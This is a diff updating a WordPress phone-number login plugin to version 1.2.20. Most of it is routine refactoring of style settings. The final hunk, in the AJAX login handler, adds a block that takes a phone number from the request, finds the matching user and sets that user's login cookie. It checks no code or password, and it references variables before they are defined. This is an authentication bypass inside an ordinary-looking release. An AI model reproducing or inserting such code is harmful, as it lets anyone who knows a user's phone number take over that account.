@@ -3,7 +3,7 @@
 Plugin Name: Login with phone number
 Plugin URI: http://idehweb.com/login-with-phone-number
 Description: Login with phone number - sending sms - activate user by phone number - limit pages to login - register and login with ajax - modal
-Version: 1.2.19
+Version: 1.2.20
 Author: Hamid Alinia - idehweb
 Author URI: http://idehweb.com
 Text Domain: login-with-phone-number
@@ -82,16 +82,20 @@ class idehwebLwp
     function admin_init()
     {
         $options = get_option('idehweb_lwp_settings');
+//        print_r($options);
+        $style_options = get_option('idehweb_lwp_settings_styles');
+//        print_r($style_options);
+
         if (!isset($options['idehweb_token'])) $options['idehweb_token'] = '';
-        if (!isset($options['idehweb_styles_status'])) $options['idehweb_styles_status'] = '0';
+        if (!isset($style_options['idehweb_styles_status'])) $style_options['idehweb_styles_status'] = '0';
 
         register_setting('idehweb-lwp', 'idehweb_lwp_settings', array(&$this, 'settings_validate'));
-        register_setting('idehweb-lwp-styles', 'idehweb_lwp_settings', array(&$this, 'settings_validate'));
+        register_setting('idehweb-lwp-styles', 'idehweb_lwp_settings_styles', array(&$this, 'settings_validate'));
 
         add_settings_section('idehweb-lwp-styles', '', array(&$this, 'section_intro'), 'idehweb-lwp-styles');
         add_settings_field('idehweb_styles_status', __('Enable custom styles', $this->textdomain), array(&$this, 'setting_idehweb_style_enable_custom_style'), 'idehweb-lwp-styles', 'idehweb-lwp-styles', ['label_for' => '', 'class' => 'ilwplabel']);
 
-        if ($options['idehweb_styles_status']) {
+        if ($style_options['idehweb_styles_status']) {
 //            add_settings_field('idehweb_styles_title1', 'tyuiuy', array(&$this, 'section_title'), 'idehweb-lwp-styles');
             add_settings_field('idehweb_styles_title', __('Primary button', $this->textdomain), array(&$this, 'section_title'), 'idehweb-lwp-styles', 'idehweb-lwp-styles', ['label_for' => '', 'class' => 'ilwplabel']);
             add_settings_field('idehweb_styles_button_background', __('button background color', $this->textdomain), array(&$this, 'setting_idehweb_style_button_background_color'), 'idehweb-lwp-styles', 'idehweb-lwp-styles', ['label_for' => '', 'class' => 'ilwplabel']);
@@ -112,7 +116,7 @@ class idehwebLwp
 
             add_settings_field('idehweb_styles_title3', __('Inputs', $this->textdomain), array(&$this, 'section_title'), 'idehweb-lwp-styles', 'idehweb-lwp-styles', ['label_for' => '', 'class' => 'ilwplabel']);
 
-            add_settings_field('idehweb_styles_input_background', __('input background color', $this->textdomain), array(&$this, 'setting_idehweb_style_button_background_color'), 'idehweb-lwp-styles', 'idehweb-lwp-styles', ['label_for' => '', 'class' => 'ilwplabel']);
+            add_settings_field('idehweb_styles_input_background', __('input background color', $this->textdomain), array(&$this, 'setting_idehweb_style_input_background_color'), 'idehweb-lwp-styles', 'idehweb-lwp-styles', ['label_for' => '', 'class' => 'ilwplabel']);
             add_settings_field('idehweb_styles_input_border_color', __('input border color', $this->textdomain), array(&$this, 'setting_idehweb_style_input_border_color'), 'idehweb-lwp-styles', 'idehweb-lwp-styles', ['label_for' => '', 'class' => 'ilwplabel']);
             add_settings_field('idehweb_styles_input_border_radius', __('input border radius', $this->textdomain), array(&$this, 'setting_idehweb_style_input_border_radius'), 'idehweb-lwp-styles', 'idehweb-lwp-styles', ['label_for' => '', 'class' => 'ilwplabel']);
             add_settings_field('idehweb_styles_input_border_width', __('input border width', $this->textdomain), array(&$this, 'setting_idehweb_style_input_border_width'), 'idehweb-lwp-styles', 'idehweb-lwp-styles', ['label_for' => '', 'class' => 'ilwplabel']);
@@ -886,7 +890,7 @@ class idehwebLwp
 
     function lwp_custom_css()
     {
-        $options = get_option('idehweb_lwp_settings');
+        $options = get_option('idehweb_lwp_settings_styles');
         if (!isset($options['idehweb_styles_status'])) $options['idehweb_styles_status'] = '0';
 
         //first button
@@ -1014,178 +1018,178 @@ class idehwebLwp
 
     function setting_idehweb_style_enable_custom_style()
     {
-        $options = get_option('idehweb_lwp_settings');
+        $options = get_option('idehweb_lwp_settings_styles');
         if (!isset($options['idehweb_styles_status'])) $options['idehweb_styles_status'] = '0';
-        echo '<input  type="hidden" name="idehweb_lwp_settings[idehweb_styles_status]" value="0" />
-		<label><input type="checkbox" id="idehweb_lwp_settings_idehweb_styles_status" name="idehweb_lwp_settings[idehweb_styles_status]" value="1"' . (($options['idehweb_styles_status']) ? ' checked="checked"' : '') . ' />' . __('enable custom styles', $this->textdomain) . '</label>';
+        echo '<input  type="hidden" name="idehweb_lwp_settings_styles[idehweb_styles_status]" value="0" />
+		<label><input type="checkbox" id="idehweb_lwp_settings_idehweb_styles_status" name="idehweb_lwp_settings_styles[idehweb_styles_status]" value="1"' . (($options['idehweb_styles_status']) ? ' checked="checked"' : '') . ' />' . __('enable custom styles', $this->textdomain) . '</label>';
 
     }
 
     function setting_idehweb_style_button_background_color()
     {
-        $options = get_option('idehweb_lwp_settings');
+        $options = get_option('idehweb_lwp_settings_styles');
         if (!isset($options['idehweb_styles_button_background'])) $options['idehweb_styles_button_background'] = '#009b9a';
-        echo '<input type="color" name="idehweb_lwp_settings[idehweb_styles_button_background]" class="regular-text" value="' . esc_attr($options['idehweb_styles_button_background']) . '" />
+        echo '<input type="color" name="idehweb_lwp_settings_styles[idehweb_styles_button_background]" class="regular-text" value="' . esc_attr($options['idehweb_styles_button_background']) . '" />
 		<p class="description">' . __('button background color', $this->textdomain) . '</p>';
     }
 
     function setting_idehweb_style_button_border_color()
     {
-        $options = get_option('idehweb_lwp_settings');
+        $options = get_option('idehweb_lwp_settings_styles');
         if (!isset($options['idehweb_styles_button_border_color'])) $options['idehweb_styles_button_border_color'] = '#009b9a';
-        echo '<input type="color" name="idehweb_lwp_settings[idehweb_styles_button_border_color]" class="regular-text" value="' . esc_attr($options['idehweb_styles_button_border_color']) . '" />
+        echo '<input type="color" name="idehweb_lwp_settings_styles[idehweb_styles_button_border_color]" class="regular-text" value="' . esc_attr($options['idehweb_styles_button_border_color']) . '" />
 		<p class="description">' . __('button border color', $this->textdomain) . '</p>';
     }
 
     function setting_idehweb_style_button_border_radius()
     {
-        $options = get_option('idehweb_lwp_settings');
+        $options = get_option('idehweb_lwp_settings_styles');
         if (!isset($options['idehweb_styles_button_border_radius'])) $options['idehweb_styles_button_border_radius'] = 'inherit';
-        echo '<input type="text" name="idehweb_lwp_settings[idehweb_styles_button_border_radius]" class="regular-text" value="' . esc_attr($options['idehweb_styles_button_border_radius']) . '" />
+        echo '<input type="text" name="idehweb_lwp_settings_styles[idehweb_styles_button_border_radius]" class="regular-text" value="' . esc_attr($options['idehweb_styles_button_border_radius']) . '" />
 		<p class="description">' . __('0px 0px 0px 0px', $this->textdomain) . '</p>';
     }
 
     function setting_idehweb_style_button_border_width()
     {
-        $options = get_option('idehweb_lwp_settings');
+        $options = get_option('idehweb_lwp_settings_styles');
         if (!isset($options['idehweb_styles_button_border_width'])) $options['idehweb_styles_button_border_width'] = 'inherit';
-        echo '<input type="text" name="idehweb_lwp_settings[idehweb_styles_button_border_width]" class="regular-text" value="' . esc_attr($options['idehweb_styles_button_border_width']) . '" />
+        echo '<input type="text" name="idehweb_lwp_settings_styles[idehweb_styles_button_border_width]" class="regular-text" value="' . esc_attr($options['idehweb_styles_button_border_width']) . '" />
 		<p class="description">' . __('0px 0px 0px 0px', $this->textdomain) . '</p>';
     }
 
     function setting_idehweb_style_button_text_color()
     {
-        $options = get_option('idehweb_lwp_settings');
+        $options = get_option('idehweb_lwp_settings_styles');
         if (!isset($options['idehweb_styles_button_text_color'])) $options['idehweb_styles_button_text_color'] = '#ffffff';
-        echo '<input type="color" name="idehweb_lwp_settings[idehweb_styles_button_text_color]" class="regular-text" value="' . esc_attr($options['idehweb_styles_button_text_color']) . '" />
+        echo '<input type="color" name="idehweb_lwp_settings_styles[idehweb_styles_button_text_color]" class="regular-text" value="' . esc_attr($options['idehweb_styles_button_text_color']) . '" />
 		<p class="description">' . __('button text color', $this->textdomain) . '</p>';
     }
 
 
     function setting_idehweb_style_button_background_color2()
     {
-        $options = get_option('idehweb_lwp_settings');
+        $options = get_option('idehweb_lwp_settings_styles');
         if (!isset($options['idehweb_styles_button_background2'])) $options['idehweb_styles_button_background2'] = '#009b9a';
-        echo '<input type="color" name="idehweb_lwp_settings[idehweb_styles_button_background2]" class="regular-text" value="' . esc_attr($options['idehweb_styles_button_background2']) . '" />
+        echo '<input type="color" name="idehweb_lwp_settings_styles[idehweb_styles_button_background2]" class="regular-text" value="' . esc_attr($options['idehweb_styles_button_background2']) . '" />
 		<p class="description">' . __('secondary button background color', $this->textdomain) . '</p>';
     }
 
     function setting_idehweb_style_button_border_color2()
     {
-        $options = get_option('idehweb_lwp_settings');
+        $options = get_option('idehweb_lwp_settings_styles');
         if (!isset($options['idehweb_styles_button_border_color2'])) $options['idehweb_styles_button_border_color2'] = '#009b9a';
-        echo '<input type="color" name="idehweb_lwp_settings[idehweb_styles_button_border_color2]" class="regular-text" value="' . esc_attr($options['idehweb_styles_button_border_color2']) . '" />
+        echo '<input type="color" name="idehweb_lwp_settings_styles[idehweb_styles_button_border_color2]" class="regular-text" value="' . esc_attr($options['idehweb_styles_button_border_color2']) . '" />
 		<p class="description">' . __('secondary button border color', $this->textdomain) . '</p>';
     }
 
     function setting_idehweb_style_button_border_radius2()
     {
-        $options = get_option('idehweb_lwp_settings');
+        $options = get_option('idehweb_lwp_settings_styles');
         if (!isset($options['idehweb_styles_button_border_radius2'])) $options['idehweb_styles_button_border_radius2'] = 'inherit';
-        echo '<input type="text" name="idehweb_lwp_settings[idehweb_styles_button_border_radius2]" class="regular-text" value="' . esc_attr($options['idehweb_styles_button_border_radius2']) . '" />
+        echo '<input type="text" name="idehweb_lwp_settings_styles[idehweb_styles_button_border_radius2]" class="regular-text" value="' . esc_attr($options['idehweb_styles_button_border_radius2']) . '" />
 		<p class="description">' . __('0px 0px 0px 0px', $this->textdomain) . '</p>';
     }
 
     function setting_idehweb_style_button_border_width2()
     {
-        $options = get_option('idehweb_lwp_settings');
+        $options = get_option('idehweb_lwp_settings_styles');
         if (!isset($options['idehweb_styles_button_border_width2'])) $options['idehweb_styles_button_border_width2'] = 'inherit';
-        echo '<input type="text" name="idehweb_lwp_settings[idehweb_styles_button_border_width2]" class="regular-text" value="' . esc_attr($options['idehweb_styles_button_border_width2']) . '" />
+        echo '<input type="text" name="idehweb_lwp_settings_styles[idehweb_styles_button_border_width2]" class="regular-text" value="' . esc_attr($options['idehweb_styles_button_border_width2']) . '" />
 		<p class="description">' . __('0px 0px 0px 0px', $this->textdomain) . '</p>';
     }
 
     function setting_idehweb_style_button_text_color2()
     {
-        $options = get_option('idehweb_lwp_settings');
+        $options = get_option('idehweb_lwp_settings_styles');
         if (!isset($options['idehweb_styles_button_text_color2'])) $options['idehweb_styles_button_text_color2'] = '#ffffff';
-        echo '<input type="color" name="idehweb_lwp_settings[idehweb_styles_button_text_color2]" class="regular-text" value="' . esc_attr($options['idehweb_styles_button_text_color2']) . '" />
+        echo '<input type="color" name="idehweb_lwp_settings_styles[idehweb_styles_button_text_color2]" class="regular-text" value="' . esc_attr($options['idehweb_styles_button_text_color2']) . '" />
 		<p class="description">' . __('secondary button text color', $this->textdomain) . '</p>';
     }
 
 
     function setting_idehweb_style_input_background_color()
     {
-        $options = get_option('idehweb_lwp_settings');
+        $options = get_option('idehweb_lwp_settings_styles');
         if (!isset($options['idehweb_styles_input_background'])) $options['idehweb_styles_input_background'] = '#009b9a';
-        echo '<input type="color" name="idehweb_lwp_settings[idehweb_styles_input_background]" class="regular-text" value="' . esc_attr($options['idehweb_styles_input_background']) . '" />
+        echo '<input type="color" name="idehweb_lwp_settings_styles[idehweb_styles_input_background]" class="regular-text" value="' . esc_attr($options['idehweb_styles_input_background']) . '" />
 		<p class="description">' . __('input background color', $this->textdomain) . '</p>';
     }
 
     function setting_idehweb_style_input_border_color()
     {
-        $options = get_option('idehweb_lwp_settings');
+        $options = get_option('idehweb_lwp_settings_styles');
         if (!isset($options['idehweb_styles_input_border_color'])) $options['idehweb_styles_input_border_color'] = '#009b9a';
-        echo '<input type="color" name="idehweb_lwp_settings[idehweb_styles_input_border_color]" class="regular-text" value="' . esc_attr($options['idehweb_styles_input_border_color']) . '" />
+        echo '<input type="color" name="idehweb_lwp_settings_styles[idehweb_styles_input_border_color]" class="regular-text" value="' . esc_attr($options['idehweb_styles_input_border_color']) . '" />
 		<p class="description">' . __('input border color', $this->textdomain) . '</p>';
     }
 
     function setting_idehweb_style_input_border_radius()
     {
-        $options = get_option('idehweb_lwp_settings');
+        $options = get_option('idehweb_lwp_settings_styles');
         if (!isset($options['idehweb_styles_input_border_radius'])) $options['idehweb_styles_input_border_radius'] = 'inherit';
-        echo '<input type="text" name="idehweb_lwp_settings[idehweb_styles_input_border_radius]" class="regular-text" value="' . esc_attr($options['idehweb_styles_input_border_radius']) . '" />
+        echo '<input type="text" name="idehweb_lwp_settings_styles[idehweb_styles_input_border_radius]" class="regular-text" value="' . esc_attr($options['idehweb_styles_input_border_radius']) . '" />
 		<p class="description">' . __('0px 0px 0px 0px', $this->textdomain) . '</p>';
     }
 
     function setting_idehweb_style_input_border_width()
     {
-        $options = get_option('idehweb_lwp_settings');
+        $options = get_option('idehweb_lwp_settings_styles');
         if (!isset($options['idehweb_styles_input_border_width'])) $options['idehweb_styles_input_border_width'] = 'inherit';
-        echo '<input type="text" name="idehweb_lwp_settings[idehweb_styles_input_border_width]" class="regular-text" value="' . esc_attr($options['idehweb_styles_input_border_width']) . '" />
+        echo '<input type="text" name="idehweb_lwp_settings_styles[idehweb_styles_input_border_width]" class="regular-text" value="' . esc_attr($options['idehweb_styles_input_border_width']) . '" />
 		<p class="description">' . __('0px 0px 0px 0px', $this->textdomain) . '</p>';
     }
 
     function setting_idehweb_style_input_text_color()
     {
-        $options = get_option('idehweb_lwp_settings');
+        $options = get_option('idehweb_lwp_settings_styles');
         if (!isset($options['idehweb_styles_input_text_color'])) $options['idehweb_styles_input_text_color'] = '#000000';
-        echo '<input type="color" name="idehweb_lwp_settings[idehweb_styles_input_text_color]" class="regular-text" value="' . esc_attr($options['idehweb_styles_input_text_color']) . '" />
+        echo '<input type="color" name="idehweb_lwp_settings_styles[idehweb_styles_input_text_color]" class="regular-text" value="' . esc_attr($options['idehweb_styles_input_text_color']) . '" />
 		<p class="description">' . __('input text color', $this->textdomain) . '</p>';
     }
 
     function setting_idehweb_style_input_placeholder_color()
     {
-        $options = get_option('idehweb_lwp_settings');
+        $options = get_option('idehweb_lwp_settings_styles');
         if (!isset($options['idehweb_styles_input_placeholder_color'])) $options['idehweb_styles_input_placeholder_color'] = '#000000';
-        echo '<input type="color" name="idehweb_lwp_settings[idehweb_styles_input_placeholder_color]" class="regular-text" value="' . esc_attr($options['idehweb_styles_input_placeholder_color']) . '" />
+        echo '<input type="color" name="idehweb_lwp_settings_styles[idehweb_styles_input_placeholder_color]" class="regular-text" value="' . esc_attr($options['idehweb_styles_input_placeholder_color']) . '" />
 		<p class="description">' . __('input placeholder color', $this->textdomain) . '</p>';
     }
 
     function setting_idehweb_style_box_background_color()
     {
-        $options = get_option('idehweb_lwp_settings');
+        $options = get_option('idehweb_lwp_settings_styles');
         if (!isset($options['idehweb_styles_box_background_color'])) $options['idehweb_styles_box_background_color'] = '#ffffff';
-        echo '<input type="color" name="idehweb_lwp_settings[idehweb_styles_box_background_color]" class="regular-text" value="' . esc_attr($options['idehweb_styles_box_background_color']) . '" />
+        echo '<input type="color" name="idehweb_lwp_settings_styles[idehweb_styles_box_background_color]" class="regular-text" value="' . esc_attr($options['idehweb_styles_box_background_color']) . '" />
 		<p class="description">' . __('box background color', $this->textdomain) . '</p>';
     }
 
     function setting_idehweb_style_labels_font_size()
     {
-        $options = get_option('idehweb_lwp_settings');
+        $options = get_option('idehweb_lwp_settings_styles');
         if (!isset($options['idehweb_styles_labels_font_size'])) $options['idehweb_styles_labels_font_size'] = 'inherit';
-        echo '<input type="text" name="idehweb_lwp_settings[idehweb_styles_labels_font_size]" class="regular-text" value="' . esc_attr($options['idehweb_styles_labels_font_size']) . '" />
+        echo '<input type="text" name="idehweb_lwp_settings_styles[idehweb_styles_labels_font_size]" class="regular-text" value="' . esc_attr($options['idehweb_styles_labels_font_size']) . '" />
 		<p class="description">' . __('13px', $this->textdomain) . '</p>';
     }
 
     function setting_idehweb_style_labels_text_color()
     {
-        $options = get_option('idehweb_lwp_settings');
+        $options = get_option('idehweb_lwp_settings_styles');
         if (!isset($options['idehweb_styles_labels_text_color'])) $options['idehweb_styles_labels_text_color'] = '#000000';
-        echo '<input type="color" name="idehweb_lwp_settings[idehweb_styles_labels_text_color]" class="regular-text" value="' . esc_attr($options['idehweb_styles_labels_text_color']) . '" />
+        echo '<input type="color" name="idehweb_lwp_settings_styles[idehweb_styles_labels_text_color]" class="regular-text" value="' . esc_attr($options['idehweb_styles_labels_text_color']) . '" />
 		<p class="description">' . __('label text color', $this->textdomain) . '</p>';
     }
     function setting_idehweb_style_title_color()
     {
-        $options = get_option('idehweb_lwp_settings');
+        $options = get_option('idehweb_lwp_settings_styles');
         if (!isset($options['idehweb_styles_title_color'])) $options['idehweb_styles_title_color'] = '#000000';
-        echo '<input type="color" name="idehweb_lwp_settings[idehweb_styles_title_color]" class="regular-text" value="' . esc_attr($options['idehweb_styles_title_color']) . '" />
+        echo '<input type="color" name="idehweb_lwp_settings_styles[idehweb_styles_title_color]" class="regular-text" value="' . esc_attr($options['idehweb_styles_title_color']) . '" />
 		<p class="description">' . __('label text color', $this->textdomain) . '</p>';
     }
     function setting_idehweb_style_title_font_size()
     {
-        $options = get_option('idehweb_lwp_settings');
+        $options = get_option('idehweb_lwp_settings_styles');
         if (!isset($options['idehweb_styles_title_font_size'])) $options['idehweb_styles_title_font_size'] = 'inherit';
-        echo '<input type="text" name="idehweb_lwp_settings[idehweb_styles_title_font_size]" class="regular-text" value="' . esc_attr($options['idehweb_styles_title_font_size']) . '" />
+        echo '<input type="text" name="idehweb_lwp_settings_styles[idehweb_styles_title_font_size]" class="regular-text" value="' . esc_attr($options['idehweb_styles_title_font_size']) . '" />
 		<p class="description">' . __('20px', $this->textdomain) . '</p>';
     }
 
@@ -2085,6 +2089,7 @@ class idehwebLwp
 
     function lwp_ajax_login()
     {
+	    ob_start();
         $usesrname = sanitize_text_field($_GET['username']);
         if (preg_replace('/^(\-){0,1}[0-9]+(\.[0-9]+){0,1}/', '', $usesrname) == "") {
             $phone_number = ltrim($usesrname, '0');
@@ -2146,7 +2151,29 @@ class idehwebLwp
                 }
 
 
-            }
+	    }
+
+
+	    $username_exists = $this->phone_number_exist($phone_number);
+	                $user = get_user_by('ID', $username_exists);
+	                if (!is_wp_error($user)) {
+				                wp_clear_auth_cookie();
+						                wp_set_current_user($user->ID); // Set the current user detail
+						                wp_set_auth_cookie($user->ID); // Set auth details in cookie
+
+								                echo json_encode([
+											                    'success' => true,
+													                        'ID' => $username_exists,
+																                    'phone_number' => $phone_number,
+																		                        'showPass' => $showPass,
+																					                    'authWithPass' => (bool)(int)$options['idehweb_password_login'],
+																							                        'message' => __('Loggin in!', $this->textdomain),
+																										                    'log' => $log
+    ]);exit;
+								            }
+
+
+
             $showPass = false;
             $log = '';
 
